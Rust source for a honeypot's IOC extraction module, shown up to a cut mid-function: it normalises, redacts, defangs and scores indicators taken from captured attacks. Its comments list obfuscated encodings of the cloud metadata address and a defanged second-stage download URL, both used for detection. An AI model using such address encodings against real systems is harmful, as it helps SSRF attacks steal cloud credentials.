//! IOC extraction (#34): indicators pulled out of attempts (#25) and their
//! capture events, deduplicated per value, with first and last seen, links
//! back to attempts and campaigns (#33), ASN context for addresses (#11) and
//! a confidence score (#27).
//!
//! Extraction is deterministic and only parses stored evidence. Nothing is
//! fetched, resolved or executed: payloads are never run to "produce better
//! IOCs". Attacker-controlled values are hostile: `value` keeps the exact
//! string (after secret and personal information redaction) for machines,
//! and `display` is defanged and escaped for people.
//!
//! When an attempt reached post-exploitation without leaving a file (a
//! memory-resident implant), its IOCs say so with `file_ioc_limited` and no
//! file hash is invented. Command lines, behaviour fingerprints and network
//! callbacks carry the weight instead.
//!
//! See `docs/iocs.md`. Contract: `schemas/ioc.schema.json`.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::attempt::{Attempt, AttemptState, StateSignal};
use crate::canary;
use crate::capture::{CaptureEvent, Channel, HookStage, PayloadRef};
use crate::confidence::{Band, ConfidenceConfig, Evidence, EvidenceSource, LinkKind, score};
use crate::enrichment::{Fact, Observable, ObservableKind, is_never_redistribute};
use crate::timeline::printable;

/// Longest value kept, in characters. Longer request strings and command
/// lines are dropped rather than cut, because a cut value is no longer an
/// exact indicator; their hashes still become IOCs.
pub const MAX_VALUE_CHARS: usize = 2048;
/// Longest user agent kept, in characters.
pub const MAX_UA_CHARS: usize = 512;
/// Most event ids listed on one IOC. `sightings` still counts every event.
pub const MAX_EVENT_REFS: usize = 32;
/// Most distinct IOCs taken from one attempt.
pub const MAX_IOCS_PER_ATTEMPT: usize = 256;
/// Most normalised steps hashed into a behaviour fingerprint.
pub const MAX_FINGERPRINT_STEPS: usize = 64;
/// Most URLs taken from one command line or text field.
pub const MAX_URLS_PER_TEXT: usize = 8;
/// Most attempts and decoys that add confidence evidence to one IOC.
pub const MAX_CONFIDENCE_ITEMS: usize = 16;
/// Version of the behaviour fingerprint format (`bf1:`).
pub const FINGERPRINT_VERSION: u32 = 1;

const FINGERPRINT_DOMAIN: &str = "foiled-behaviour-fingerprint/v1";
const REDACTED: &str = "REDACTED";

/// A parameter, field or header name containing one of these (ignoring
/// case) names a secret: `password`, `X-Amz-Signature`, `db_passwd`,
/// `apiToken`, `sessid`.
const SECRET_KEY_PARTS: &[&str] = &[
    "secret",
    "token",
    "password",
    "passwd",
    "api-key",
    "api_key",
    "apikey",
    "private_key",
    "private-key",
    "privatekey",
    "signature",
    "session",
    "sessid",
    "credential",
    "cookie",
    "jwt",
];

/// Name components (split on `-`, `_` and camel case) that name a secret
/// only as a whole component, because as substrings they would hit
/// ordinary names: `auth` is a secret in `X-Auth-Token` and `basic_auth`,
/// not in `author`; `pass` in `db_pass`, not in `passport`.
const SECRET_KEY_COMPONENTS: &[&str] = &["auth", "authorization", "pass", "pwd", "sig", "sid"];

/// Values after a secret-named key that are settings, not secrets
/// (`PasswordAuthentication=no`).
const NOT_SECRET_VALUES: &[&str] = &["yes", "no", "true", "false", "on", "off", "none", "null"];

/// Longest parameter or header name considered.
const MAX_KEY_CHARS: usize = 48;

fn secret_key(name: &str) -> bool {
    let k = name.trim_start_matches('-');
    let lower = k.to_ascii_lowercase();
    if lower == "key" || SECRET_KEY_PARTS.iter().any(|p| lower.contains(p)) {
        return true;
    }
    // Components: split on separators and lower-to-upper case changes.
    let mut comps: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut prev_lower = false;
    for c in k.chars() {
        if c == '-' || c == '_' {
            comps.push(std::mem::take(&mut cur));
            prev_lower = false;
            continue;
        }
        if c.is_ascii_uppercase() && prev_lower {
            comps.push(std::mem::take(&mut cur));
        }
        prev_lower = c.is_ascii_lowercase() || c.is_ascii_digit();
        cur.push(c.to_ascii_lowercase());
    }
    comps.push(cur);
    comps
        .iter()
        .any(|c| SECRET_KEY_COMPONENTS.contains(&c.as_str()))
}

/// Flags whose next word is a secret, for any program.
const SECRET_FLAGS: &[&str] = &[
    "--api-key",
    "--apikey",
    "--pass",
    "--password",
    "--secret",
    "--token",
    "-pass",
    "-passin",
    "-passout",
    "bearer",
];

/// Short flags that carry a password for particular programs, either
/// attached (`-pPW`) or as the next word (`-p PW`): `(program, flag,
/// attached, separate)`.
const PROGRAM_SECRET_FLAGS: &[(&str, &str, bool, bool)] = &[
    ("mysql", "-p", true, false),
    ("mysqldump", "-p", true, false),
    ("mysqladmin", "-p", true, false),
    ("mariadb", "-p", true, false),
    ("mariadb-dump", "-p", true, false),
    ("sshpass", "-p", true, true),
    ("redis-cli", "-a", false, true),
    ("mosquitto_pub", "-P", false, true),
    ("mosquitto_sub", "-P", false, true),
    ("zip", "-P", false, true),
    ("unzip", "-P", false, true),
    ("7z", "-p", true, false),
    ("7za", "-p", true, false),
];

/// Flags whose next word is `user:password` (or `user%password` for
/// `smbclient -U`): the password part is redacted, the user kept.
const USER_PASS_FLAGS: &[&str] = &["-u", "--user", "--proxy-user", "-U"];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocType {
    /// IPv4 address.
    Ip,
    Ipv6,
    Domain,
    Url,
    /// Request path and query, exactly as sent (after redaction).
    HttpPath,
    /// HTTP User-Agent header.
    HttpUa,
    /// An exact request string: a protocol command, or an inline body or
    /// request slice when payload storage is on (#16).
    RequestSubstring,
    /// SHA-256 of what was sent to the decoy (body or request slice).
    PayloadSha256,
    /// SHA-256 of a file the attacker left (quarantine, implant).
    FileSha256,
    /// A command the attacker ran or tried to run.
    Cmdline,
    /// A DNS name the decoy was made to look up.
    DnsQuery,
    /// Stable id over the attempt's normalised steps (`bf1:`).
    BehaviourFingerprint,
}

impl IocType {
    pub const ALL: [IocType; 12] = [
        IocType::Ip,
        IocType::Ipv6,
        IocType::Domain,
        IocType::Url,
        IocType::HttpPath,
        IocType::HttpUa,
        IocType::RequestSubstring,
        IocType::PayloadSha256,
        IocType::FileSha256,
        IocType::Cmdline,
        IocType::DnsQuery,
        IocType::BehaviourFingerprint,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            IocType::Ip => "ip",
            IocType::Ipv6 => "ipv6",
            IocType::Domain => "domain",
            IocType::Url => "url",
            IocType::HttpPath => "http_path",
            IocType::HttpUa => "http_ua",
            IocType::RequestSubstring => "request_substring",
            IocType::PayloadSha256 => "payload_sha256",
            IocType::FileSha256 => "file_sha256",
            IocType::Cmdline => "cmdline",
            IocType::DnsQuery => "dns_query",
            IocType::BehaviourFingerprint => "behaviour_fingerprint",
        }
    }

    pub fn parse(s: &str) -> Option<IocType> {
        IocType::ALL.into_iter().find(|t| t.as_str() == s)
    }

    /// Types whose values compare without regard to ASCII case.
    pub fn case_insensitive(self) -> bool {
        matches!(
            self,
            IocType::Ip
                | IocType::Ipv6
                | IocType::Domain
                | IocType::DnsQuery
                | IocType::PayloadSha256
                | IocType::FileSha256
                | IocType::BehaviourFingerprint
        )
    }
}

/// What the value was to the attack. One IOC can hold several roles, for
/// example an address that both attacked and served the second stage.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocRole {
    /// Where the attack came from.
    Source,
    /// Exact strings from the attacker's requests.
    Request,
    /// What reached the decoy or the vulnerable code, by hash or exact slice.
    Payload,
    /// Where the decoy was made to call back to (DNS, egress, exfiltration).
    Callback,
    /// A second-stage download location.
    Stage2,
    /// Something the attacker ran or left after exploitation.
    PostExploit,
    /// A behaviour fingerprint.
    Behaviour,
}

/// Where an IOC came from. Extraction only produces `observed`; values found
/// by pivoting on enrichment data are `enrichment_pivot` and are never
/// contributed back (`docs/contribute-back.md`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocOrigin {
    Observed,
    EnrichmentPivot,
}

/// ASN or country context for an address, from an enrichment Fact (#11).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EnrichmentRef {
    pub provider: String,
    /// `asn.number`, `asn.org` or `geo.country`.
    pub key: String,
    pub value: Value,
    pub observed_at: i64,
    /// False when the provider is on the never-redistribute list. Exports
    /// drop those refs ([`redact_for_export`]).
    pub shareable: bool,
}

/// What a behaviour fingerprint was computed over.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FingerprintDetail {
    pub version: u32,
    /// Normalised steps in order, exactly as hashed.
    pub steps: Vec<String>,
}

/// The #27 score for the indicator, condensed from a `ConfidenceLink` of
/// kind `attempt_ioc`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct IocConfidence {
    pub score: u8,
    pub band: Band,
    pub wording: String,
    pub publishable: bool,
    pub evidence: Vec<Evidence>,
    pub caps_applied: Vec<String>,
}

/// One indicator. Mirrors `schemas/ioc.schema.json`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Ioc {
    /// `ioc_` plus 24 hex characters over type and value. The same value
    /// always has the same id, across attempts, windows and tenants.
    pub ioc_id: String,
    #[serde(rename = "type")]
    pub ioc_type: IocType,
    /// Exact normalised value. Hostile text: escape before rendering.
    pub value: String,
    /// Defanged and escaped for people. Never parse this.
    pub display: String,
    pub roles: Vec<IocRole>,
    pub origin: IocOrigin,
    /// True when secrets or personal information were removed from `value`.
    pub redacted: bool,
    /// True when an attempt this was seen in reached post-exploitation
    /// without a captured file, so file hashes are missing on purpose.
    pub file_ioc_limited: bool,
    pub first_seen: i64,
    pub last_seen: i64,
    /// Capture events the value was seen in (attempts, for fingerprints).
    pub sightings: u32,
    pub attempt_ids: Vec<String>,
    pub campaign_ids: Vec<String>,
    pub decoy_ids: Vec<String>,
    pub catalogue_ids: Vec<String>,
    /// Up to [`MAX_EVENT_REFS`] event ids, oldest first.
    pub event_ids: Vec<String>,
    /// `channel:field` pairs the value was read from.
    pub extracted_from: Vec<String>,
    pub enrichment: Vec<EnrichmentRef>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub fingerprint: Option<FingerprintDetail>,
    pub confidence: IocConfidence,
}

/// The IOC side of one attempt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AttemptIocs {
    pub attempt_id: String,
    /// IOC ids in order of first appearance in the attempt.
    pub ioc_refs: Vec<String>,
    pub file_ioc_limited: bool,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq)]
pub struct Extraction {
    /// Sorted by first seen, then type, then value.
    pub iocs: Vec<Ioc>,
    /// One per input attempt, in input order.
    pub attempts: Vec<AttemptIocs>,
}

impl Extraction {
    pub fn for_attempt(&self, attempt_id: &str) -> Option<&AttemptIocs> {
        self.attempts.iter().find(|a| a.attempt_id == attempt_id)
    }

    pub fn get(&self, ioc_id: &str) -> Option<&Ioc> {
        self.iocs.iter().find(|i| i.ioc_id == ioc_id)
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct ExtractOptions {
    /// Mirrors `store_payloads` in the retention config (#16). Off: inline
    /// bodies and request slices are never IOC values, only their hashes.
    pub store_payloads: bool,
}

/// `ioc_` plus 24 hex characters of SHA-256 over type and value.
pub fn ioc_id(ty: IocType, value: &str) -> String {
    let h = Sha256::digest(format!("{}\n{value}", ty.as_str()).as_bytes());
    format!("ioc_{}", hex::encode(&h[..12]))
}

// ---------------------------------------------------------------------------
// Redaction, defanging and refanging
// ---------------------------------------------------------------------------

/// Remove secrets and personal information from attacker text, keeping its
/// shape: URL passwords (`scheme://user:REDACTED@host`), values after
/// secret-named keys, headers and flags (`password=REDACTED`,
/// `X-Api-Key: REDACTED`, `--password REDACTED`), program password flags
/// (`mysql -pREDACTED`, `sshpass -p REDACTED`, `curl -u user:REDACTED`),
/// bearer tokens and the local part of email addresses. Returns the new
/// text and whether anything changed. Linear in the input.
pub fn redact(s: &str) -> (String, bool) {
    let out = redact_emails(&redact_pairs(&redact_flags(&redact_userinfo(s))));
    let changed = out != s;
    (out, changed)
}

/// `scheme://user:pw@host` becomes `scheme://user:REDACTED@host`; userinfo
/// without a password (often a token, `https://TOKEN@host`) becomes
/// `REDACTED@host`.
fn redact_userinfo(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find("://") {
        let (head, tail) = rest.split_at(i + 3);
        out.push_str(head);
        let end = tail
            .find(|c: char| matches!(c, '/' | '?' | '#' | '\'' | '"') || c.is_whitespace())
            .unwrap_or(tail.len());
        let authority = &tail[..end];
        match authority.rfind('@') {
            Some(at) => {
                match authority[..at].split_once(':') {
                    Some((user, _)) if !user.is_empty() => {
                        out.push_str(user);
                        out.push(':');
                    }
                    _ => {}
                }
                out.push_str(REDACTED);
                out.push_str(&authority[at..]);
            }
            None => out.push_str(authority),
        }
        rest = &tail[end..];
    }
    out.push_str(rest);
    out
}

fn value_end(c: char) -> bool {
    matches!(c, '&' | ';' | '\'' | '"' | '#' | ',' | '}' | ']') || c.is_whitespace()
}

fn key_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-')
}

/// Redact the value after a secret-named key in query strings
/// (`password=x`), config lines (`password = x`), JSON (`"Password" : "x"`)
/// and headers (`X-Api-Key: k1 k2`, the whole value to the end of the line
/// or quote). Names are matched by [`secret_key`]. A header needs a space
/// after the colon, so `auth-server:8080` is a host and port, not a header.
/// Setting words (`PasswordAuthentication=no`) are kept. Look-back is
/// bounded, so this is linear in the input.
fn redact_pairs(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        out.push(c);
        if c != '=' && c != ':' {
            continue;
        }
        let before = &out[..out.len() - 1];
        let trimmed = before.trim_end_matches([' ', '\t']);
        // JSON and quoted keys end with a quote before the separator.
        let quoted = trimmed.ends_with('"') || trimmed.ends_with('\'');
        let name_end = trimmed.len() - usize::from(quoted);
        let key_len = trimmed[..name_end]
            .chars()
            .rev()
            .take(MAX_KEY_CHARS + 1)
            .take_while(|ch| key_char(*ch))
            .count();
        if key_len == 0 || key_len > MAX_KEY_CHARS {
            continue;
        }
        let key = &trimmed[name_end - key_len..name_end];
        let starts_word = trimmed[..name_end - key_len]
            .chars()
            .next_back()
            .is_none_or(|p| {
                matches!(p, '?' | '&' | ';' | '\'' | '"' | '{' | ',' | '(' | '[')
                    || p.is_whitespace()
            });
        let header = c == ':' && !quoted;
        if !starts_word
            || !secret_key(key)
            || (header && !chars.peek().is_some_and(|n| *n == ' ' || *n == '\t'))
        {
            continue;
        }
        while chars.peek().is_some_and(|n| *n == ' ' || *n == '\t') {
            out.push(chars.next().unwrap_or(' '));
        }
        let quote = match chars.peek() {
            Some(&q @ ('"' | '\'')) => {
                out.push(q);
                chars.next();
                Some(q)
            }
            _ => None,
        };
        let mut value = String::new();
        while let Some(&n) = chars.peek() {
            let end = match quote {
                Some(q) => n == q,
                None if header => matches!(n, '\n' | '\r' | '\'' | '"'),
                None => value_end(n),
            };
            if end {
                break;
            }
            value.push(n);
            chars.next();
        }
        let setting = NOT_SECRET_VALUES
            .iter()
            .any(|w| value.trim().eq_ignore_ascii_case(w));
        if value.is_empty() || setting {
            out.push_str(&value);
        } else {
            // Keep trailing spaces of a header value outside the redaction.
            let kept = value.len() - value.trim_end().len();
            out.push_str(REDACTED);
            out.push_str(&value[value.len() - kept..]);
        }
    }
    out
}

/// What a flag says about the next word.
#[derive(Clone, Copy, PartialEq, Eq)]
enum NextWord {
    Keep,
    Secret,
    /// `user:password` or `user%password`: keep the user.
    UserPass,
}

/// Wrappers that run the next word as the program.
const WRAPPERS: &[&str] = &["sudo", "env", "nohup", "exec", "time", "command", "xargs"];

fn command_break(word: &str) -> bool {
    matches!(word, "|" | "||" | "&&" | ";" | "&")
        || word.ends_with(';')
        || word.ends_with('|')
        || word.ends_with("&&")
}

/// Replace `inner` within `word` (which may carry quotes around it).
fn rewrap(word: &str, inner: &str, with: &str) -> String {
    match word.find(inner) {
        Some(i) => format!("{}{with}{}", &word[..i], &word[i + inner.len()..]),
        None => with.to_string(),
    }
}

/// Redact the word after secret flags (`--password x`, `-passin x`,
/// `Bearer x`), the password half of `-u user:pw`, and program-specific
/// password flags (`mysql -pPW`, `sshpass -p PW`, `redis-cli -a PW`). The
/// program is the first word of each command, after wrappers such as
/// `sudo` and inside `sh -c '...'`.
fn redact_flags(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut next = NextWord::Keep;
    let mut prog = String::new();
    let mut at_start = true;
    let mut after_dash_c = false;
    for piece in s.split_inclusive(char::is_whitespace) {
        let word = piece.trim_end();
        let tail = &piece[word.len()..];
        if word.is_empty() {
            out.push_str(piece);
            continue;
        }
        let bare = word.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '(' | ')' | '$'));
        match std::mem::replace(&mut next, NextWord::Keep) {
            NextWord::Secret if !bare.is_empty() => {
                out.push_str(&rewrap(word, bare, REDACTED));
                out.push_str(tail);
                continue;
            }
            NextWord::UserPass => {
                if let Some(i) = bare.find([':', '%']) {
                    let with = format!("{}{REDACTED}", &bare[..=i]);
                    out.push_str(&rewrap(word, bare, &with));
                    out.push_str(tail);
                    continue;
                }
            }
            _ => {}
        }
        if at_start || (after_dash_c && word.starts_with(['\'', '"'])) {
            let base = bare.rsplit('/').next().unwrap_or(bare);
            prog = base.to_ascii_lowercase();
            at_start = WRAPPERS.contains(&prog.as_str());
        } else if prog == "env" && bare.contains('=') {
            at_start = true;
        }
        after_dash_c = bare == "-c";
        let lw = bare.to_ascii_lowercase();
        if SECRET_FLAGS.contains(&lw.as_str()) {
            next = NextWord::Secret;
        } else if USER_PASS_FLAGS.contains(&bare) {
            next = NextWord::UserPass;
        } else if let Some(&(_, flag, attached, separate)) = PROGRAM_SECRET_FLAGS
            .iter()
            .find(|(p, f, _, _)| *p == prog && bare.starts_with(f))
        {
            if bare == flag && separate {
                next = NextWord::Secret;
            } else if attached && bare.len() > flag.len() {
                out.push_str(&rewrap(word, bare, &format!("{flag}{REDACTED}")));
                out.push_str(tail);
                at_start |= command_break(word);
                continue;
            }
        }
        out.push_str(piece);
        if command_break(word) {
            at_start = true;
        }
    }
    out
}

/// Redact credential arguments of a protocol command by position. `tokens`
/// is the command, then its subcommand when the capture logs it apart, then
/// the arguments. Returns whether anything changed.
fn redact_command(tokens: &mut [String]) -> bool {
    let up = |t: &[String], i: usize| t.get(i).map(|x| x.to_ascii_uppercase());
    let n = tokens.len();
    let mut hits: Vec<usize> = Vec::new();
    match up(tokens, 0).as_deref() {
        // AUTH [user] password, LOGIN [user] password.
        Some("AUTH" | "LOGIN") if n >= 2 => hits.push(n - 1),
        Some("PASS") => hits.extend(1..n),
        // HELLO protover AUTH user password.
        Some("HELLO") => {
            if let Some(i) = (1..n).find(|&i| up(tokens, i).as_deref() == Some("AUTH")) {
                hits.push(i + 2);
            }
        }
        // MIGRATE ... AUTH password | AUTH2 user password.
        Some("MIGRATE") => {
            for i in 1..n {
                match up(tokens, i).as_deref() {
                    Some("AUTH") => hits.push(i + 1),
                    Some("AUTH2") => hits.push(i + 2),
                    _ => {}
                }
            }
        }
        // CONFIG SET name value [name value ...].
        Some("CONFIG") if up(tokens, 1).as_deref() == Some("SET") => {
            let mut i = 2;
            while i + 1 < n {
                let name = tokens[i].to_ascii_lowercase();
                if name == "requirepass"
                    || name == "masterauth"
                    || name.ends_with("pass")
                    || secret_key(&name)
                {
                    hits.push(i + 1);
                }
                i += 2;
            }
        }
        _ => {}
    }
    let mut changed = false;
    // ACL SETUSER name rule...: `>pw`, `<pw`, `#hash` and `!hash` are
    // passwords or their hashes.
    if up(tokens, 0).as_deref() == Some("ACL") && up(tokens, 1).as_deref() == Some("SETUSER") {
        for t in tokens.iter_mut().skip(3) {
            if let Some(first @ ('>' | '<' | '#' | '!')) = t.chars().next()
                && t.len() > 1
            {
                *t = format!("{first}{REDACTED}");
                changed = true;
            }
        }
    }
    for i in hits {
        if i < n && tokens[i] != REDACTED {
            tokens[i] = REDACTED.to_string();
            changed = true;
        }
    }
    changed
}

/// Replace the local part of email addresses, written plainly or with the
/// `@` URL-encoded (`%40`).
fn redact_emails(s: &str) -> String {
    let local_char =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '%' | '+' | '-');
    let mut out = String::with_capacity(s.len());
    for (i, c) in s.char_indices() {
        let sep = if c == '@' {
            1
        } else if c == '%' && s[i..].get(..3).is_some_and(|x| x == "%40") {
            3
        } else {
            0
        };
        if sep > 0 {
            let domain: String = s[i + sep..]
                .chars()
                .take(254)
                .take_while(|d| d.is_ascii_alphanumeric() || matches!(d, '.' | '-'))
                .collect();
            let domain = domain.trim_end_matches('.');
            let tld_ok = domain.rsplit_once('.').is_some_and(|(_, tld)| {
                tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
            });
            let local_len = out
                .chars()
                .rev()
                .take(65)
                .take_while(|ch| local_char(*ch))
                .count();
            if tld_ok && (1..=64).contains(&local_len) {
                let local = &out[out.len() - local_len..];
                if local != REDACTED {
                    out.truncate(out.len() - local_len);
                    out.push_str(REDACTED);
                }
            }
        }
        out.push(c);
    }
    out
}

/// Replace URL schemes with their defanged forms, ignoring ASCII case.
fn defang_schemes(s: &str) -> String {
    let mut out = s.to_string();
    for (from, to) in [
        ("https://", "hxxps://"),
        ("http://", "hxxp://"),
        ("ftp://", "fxp://"),
    ] {
        let lower = out.to_ascii_lowercase();
        let mut next = String::with_capacity(out.len() + 8);
        let mut last = 0;
        for (i, _) in lower.match_indices(from) {
            next.push_str(&out[last..i]);
            next.push_str(to);
            last = i + from.len();
        }
        next.push_str(&out[last..]);
        out = next;
    }
    out
}

/// The defanged, escaped form shown to people: `203[.]0[.]113[.]7`,
/// `hxxp://stage2[.]example[.]invalid/x.sh`. Never parse it back.
pub fn defang(ty: IocType, value: &str) -> String {
    let d = match ty {
        IocType::Ip | IocType::Domain | IocType::DnsQuery => value.replace('.', "[.]"),
        IocType::Ipv6 => value.replace(':', "[:]"),
        _ => defang_authorities(&defang_schemes(value)),
    };
    printable(&d)
}

/// Bracket the dots in the host part of every URL in `s`.
fn defang_authorities(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 16);
    let mut rest = s;
    while let Some(i) = rest.find("://") {
        let (head, tail) = rest.split_at(i + 3);
        out.push_str(head);
        let end = tail
            .find(|c: char| matches!(c, '/' | '?' | '#' | '\'' | '"') || c.is_whitespace())
            .unwrap_or(tail.len());
        out.push_str(&tail[..end].replace('.', "[.]"));
        rest = &tail[end..];
    }
    out.push_str(rest);
    out
}

/// Undo common defanging so a pasted indicator can be searched.
pub fn refang(s: &str) -> String {
    let s = s
        .trim()
        .replace("[.]", ".")
        .replace("(.)", ".")
        .replace("[:]", ":")
        .replace("[://]", "://");
    let lower = s.to_ascii_lowercase();
    for (from, to) in [
        ("hxxps://", "https://"),
        ("hxxp://", "http://"),
        ("fxp://", "ftp://"),
    ] {
        if lower.starts_with(from) {
            return format!("{to}{}", &s[from.len()..]);
        }
    }
    s
}

// ---------------------------------------------------------------------------
// Candidates from capture events
// ---------------------------------------------------------------------------

struct Candidate {
    ty: IocType,
    value: String,
    redacted: bool,
    role: IocRole,
    field: String,
    events: Vec<(i64, String)>,
    fingerprint: Option<FingerprintDetail>,
}

fn text<'a>(e: &'a CaptureEvent, k: &str) -> Option<&'a str> {
    e.data
        .get(k)
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
}

fn words(v: Option<&Value>) -> Option<String> {
    match v? {
        Value::String(s) => Some(s.trim().to_string()).filter(|s| !s.is_empty()),
        Value::Array(a) => {
            let parts: Vec<String> = a
                .iter()
                .filter_map(|x| match x {
                    Value::String(s) => Some(s.clone()),
                    Value::Number(n) => Some(n.to_string()),
                    _ => None,
                })
                .collect();
            Some(parts.join(" ")).filter(|s| !s.trim().is_empty())
        }
        _ => None,
    }
}

fn too_long(s: &str, max: usize) -> bool {
    s.chars().nth(max).is_some()
}

/// Values that name a planted canary or its beacon are never IOCs: they are
/// Foiled's own secrets, not the attacker's infrastructure (#17).
fn names_canary(v: &str, e: &CaptureEvent) -> bool {
    let l = v.to_ascii_lowercase();
    [
        canary::PREFIX,
        canary::DB_USER_PREFIX,
        canary::CLOUD_SECRET_PREFIX,
        canary::DB_HOST,
    ]
    .iter()
    .any(|m| l.contains(&m.to_ascii_lowercase()))
        || text(e, "canary_id").is_some_and(|id| v.contains(id))
}

/// One part of a loose IPv4 address, as `inet_aton` and WHATWG URL
/// parsing read it: `0x` hexadecimal, a leading `0` octal, else decimal.
fn ipv4_part(p: &str) -> Option<u64> {
    if p.is_empty() || p.len() > 34 {
        return None;
    }
    if let Some(hex) = p.strip_prefix("0x").or_else(|| p.strip_prefix("0X")) {
        return if hex.is_empty() {
            Some(0)
        } else {
            u64::from_str_radix(hex, 16).ok()
        };
    }
    if p.len() > 1 && p.starts_with('0') {
        return u64::from_str_radix(&p[1..], 8).ok();
    }
    if p.bytes().all(|b| b.is_ascii_digit()) {
        p.parse().ok()
    } else {
        None
    }
}

/// IPv4 in every form a URL or resolver accepts: one to four parts, each
/// decimal, octal or hexadecimal, the last part filling the remaining bytes
/// (`127.1`, `169.254.43518`, `2852039166`, `0251.0376.0251.0376`,
/// `0xa9.0xfe.0xa9.0xfe`).
fn parse_ipv4_loose(s: &str) -> Option<std::net::Ipv4Addr> {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.is_empty() || parts.len() > 4 {
        return None;
    }
    let nums: Vec<u64> = parts.iter().map(|p| ipv4_part(p)).collect::<Option<_>>()?;
    let (last, head) = nums.split_last()?;
    if head.iter().any(|n| *n > 255) {
        return None;
    }
    let width = 8 * (5 - nums.len() as u32);
    if width < 64 && *last >= 1u64 << width {
        return None;
    }
    let mut n: u64 = 0;
    for (i, h) in head.iter().enumerate() {
        n |= h << (24 - 8 * i as u32);
    }
    n |= last;
    u32::try_from(n).ok().map(std::net::Ipv4Addr::from)
}

/// A host name with the trailing root dots removed and lower case:
/// `Metadata.Google.Internal.` and `metadata.google.internal` are one name.
fn host_key(raw: &str) -> String {
    raw.trim().trim_end_matches('.').to_ascii_lowercase()
}

/// Parse an address literal in any form a URL or resolver accepts:
/// IPv6 (bracketed or not), and loose IPv4 ([`parse_ipv4_loose`]), with
/// trailing dots ignored.
fn parse_ip(raw: &str) -> Option<IpAddr> {
    let raw = raw.trim().trim_start_matches('[').trim_end_matches(']');
    let raw = raw.trim_end_matches('.');
    if let Ok(ip) = raw.parse::<IpAddr>() {
        return Some(ip.to_canonical());
    }
    parse_ipv4_loose(raw).map(IpAddr::V4)
}

/// True for addresses that are the decoy's own or the platform's network:
/// private, loopback, link-local (including the cloud metadata address
/// 169.254.169.254), carrier-grade NAT, unique local (fd00::/8), multicast
/// and unspecified. These are never IOCs, whether bare or inside a URL.
fn internal_ip(ip: IpAddr) -> bool {
    Observable::ip(&ip.to_string()).is_ok_and(|o| !o.is_external_lookup_eligible())
}

/// Local and platform names: `localhost`, `.local`, `.internal` (which
/// covers `metadata.google.internal`), `.home.arpa`, `.lan`, `.localdomain`
/// and reverse lookups.
fn internal_name(d: &str) -> bool {
    let d = host_key(d);
    d == "localhost"
        || [
            ".localhost",
            ".local",
            ".internal",
            ".home.arpa",
            ".lan",
            ".localdomain",
            ".in-addr.arpa",
            ".ip6.arpa",
        ]
        .iter()
        .any(|s| d.ends_with(s))
        || !d.contains('.')
}

fn norm_ip(raw: &str) -> Option<(IocType, String)> {
    let o = Observable::ip(&parse_ip(raw)?.to_string()).ok()?;
    // The decoy's own network (guest, bridge, resolver) is never an IOC.
    if !o.is_external_lookup_eligible() {
        return None;
    }
    let ty = if o.value.contains(':') {
        IocType::Ipv6
    } else {
        IocType::Ip
    };
    Some((ty, o.value))
}

fn norm_domain(raw: &str) -> Option<String> {
    if parse_ip(raw).is_some() {
        return None;
    }
    let o = Observable::domain(&host_key(raw)).ok()?;
    // Single-label and local names are not attacker infrastructure.
    (!internal_name(&o.value)).then_some(o.value)
}

/// Host part of a URL authority or a Host header, without port or
/// credentials.
fn host_of(authority: &str) -> &str {
    let a = authority.rsplit('@').next().unwrap_or("");
    if let Some(rest) = a.strip_prefix('[') {
        return rest.split(']').next().unwrap_or("");
    }
    match a.split_once(':') {
        Some((h, port)) if !port.contains(':') => h,
        _ => a,
    }
}

fn url_authority(url: &str) -> Option<&str> {
    let rest = &url[url.find("://")? + 3..];
    Some(&rest[..rest.find(['/', '?', '#']).unwrap_or(rest.len())])
}

struct Sink<'a> {
    e: &'a CaptureEvent,
    out: &'a mut Vec<Candidate>,
}

impl Sink<'_> {
    fn push(&mut self, ty: IocType, value: String, redacted: bool, role: IocRole, field: &str) {
        self.out.push(Candidate {
            ty,
            value,
            redacted,
            role,
            field: format!("{}:{field}", self.e.channel.as_str()),
            events: vec![(self.e.ts, self.e.event_id.clone())],
            fingerprint: None,
        });
    }

    fn ip(&mut self, raw: &str, role: IocRole, field: &str) {
        if let Some((ty, v)) = norm_ip(raw) {
            self.push(ty, v, false, role, field);
        }
    }

    /// A host name or address literal, as found in a Host header or URL.
    fn host(&mut self, raw: &str, role: IocRole, field: &str) {
        let h = host_of(raw.trim());
        if let Some(ip) = parse_ip(h) {
            self.ip(&ip.to_string(), role, field);
        } else if !names_canary(h, self.e)
            && let Some(d) = norm_domain(h)
        {
            self.push(IocType::Domain, d, false, role, field);
        }
    }

    fn sha(&mut self, ty: IocType, raw: &str, role: IocRole, field: &str) {
